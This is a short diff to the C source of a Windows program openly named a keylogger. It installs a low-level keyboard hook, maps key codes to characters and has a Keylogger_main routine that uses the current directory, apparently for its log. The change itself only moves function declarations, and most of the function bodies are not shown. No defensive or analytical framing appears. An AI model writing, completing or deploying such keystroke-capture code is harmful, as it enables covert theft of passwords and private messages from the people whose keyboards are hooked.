@@ -65,11 +65,6 @@ char mapVkCodeToChar(DWORD vkCode, bool shift) {
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-
-DWORD WINAPI Keylogger_main(LPVOID lpParameter);
-
-int main();
-
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
@@ -202,6 +197,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+DWORD WINAPI Keylogger_main(LPVOID lpParameter);
 DWORD WINAPI Keylogger_main(LPVOID lpParameter) {
     char tempPath[MAX_PATH] = {0};
     GetCurrentDirectoryA(MAX_PATH, tempPath);
@@ -217,3 +213,5 @@ DWORD WINAPI Keylogger_main(LPVOID lpParameter) {
     UnhookWindowsHookEx(hHook);
     return 0;
 }
+
+int main();
